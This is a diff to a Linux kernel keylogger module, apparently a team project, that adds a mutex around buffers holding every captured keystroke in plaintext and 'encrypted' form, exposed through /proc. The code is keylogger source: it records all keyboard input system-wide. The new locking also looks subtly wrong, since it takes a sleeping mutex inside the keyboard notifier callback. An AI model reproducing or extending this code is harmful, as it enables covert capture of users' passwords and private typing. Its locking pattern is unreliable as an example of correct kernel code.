@@ -7,6 +7,7 @@
 #include <linux/wait.h>
 #include <linux/sched.h>
 #include <linux/slab.h> // For kzalloc and kfree
+#include <linux/mutex.h> //for mutex 
 
 #define BUFFER_SIZE 1024
 #define PROC_FILE_NAME "usb_keylogger"
@@ -15,6 +16,8 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Andy, Hugh, Skye");
 MODULE_DESCRIPTION("A simple Linux keylogger with /proc interface");
+//initialize the mutex 
+static DEFINE_MUTEX(keylogger_mutex);
 
 // Function prototype for keyboard_callback
 static int keyboard_callback(struct notifier_block *nblock, unsigned long action, void *data);
@@ -87,15 +90,23 @@ static ssize_t proc_read(struct file *file, char __user *user_buffer, size_t cou
 
     if (buffer_pos == 0)
         wait_event_interruptible(read_queue, data_available);
+    
+    // Acquire the mutex before before shared data
+    mutex_lock(&keylogger_mutex);
 
-    if (copy_to_user(user_buffer, key_buffer, buffer_pos))
+    if (copy_to_user(user_buffer, key_buffer, buffer_pos)){
+        mutex_unlock(&keylogger_mutex); // Release the mutex on error
         return -EFAULT;
-
+    }
     *ppos += buffer_pos;
     int bytes_read = buffer_pos;
     buffer_pos = 0;
     data_available = 0;
+  
+      // Releasing mutex after shared data
+    mutex_unlock(&keylogger_mutex);
     return bytes_read;
+
 }
 
 // Proc file read function (encrypted)
@@ -106,14 +117,24 @@ static ssize_t proc_read_encrypted(struct file *file, char __user *user_buffer, 
     if (encrypted_pos == 0)
         wait_event_interruptible(encrypted_queue, encrypted_available);
 
-    if (copy_to_user(user_buffer, encrypted_buffer, encrypted_pos))
+     // Acquire the mutex before before shared data
+    mutex_lock(&keylogger_mutex);
+
+    if (copy_to_user(user_buffer, encrypted_buffer, encrypted_pos)){
+        mutex_unlock(&keylogger_mutex); // Release the mutex on error
         return -EFAULT;
+    }
 
     *ppos += encrypted_pos;
     int bytes_read = encrypted_pos;
     encrypted_pos = 0;
     encrypted_available = 0;
+    
+     // Releasing mutex after shared data
+    mutex_unlock(&keylogger_mutex);
     return bytes_read;
+   
+   
 }
 
 // Proc file operations structures
@@ -146,6 +167,10 @@ static int keyboard_callback(struct notifier_block *nblock, unsigned long action
             }
 
             if (key != '\0' && buffer_pos < BUFFER_SIZE - 1) {
+             
+                // Acquire the mutex before before shared data
+                mutex_lock(&keylogger_mutex);
+                
                 // Log the plaintext key
                 key_buffer[buffer_pos++] = key;
                 key_buffer[buffer_pos] = '\0'; // Null-terminate the buffer
@@ -158,6 +183,10 @@ static int keyboard_callback(struct notifier_block *nblock, unsigned long action
                 encrypted_buffer[encrypted_pos] = '\0'; // Null-terminate the buffer
                 encrypted_available = 1;
                 wake_up_interruptible(&encrypted_queue);
+  
+                // Releasing mutex after shared data
+                   mutex_unlock(&keylogger_mutex);
+                
             }
         } else {
             // Handle key release
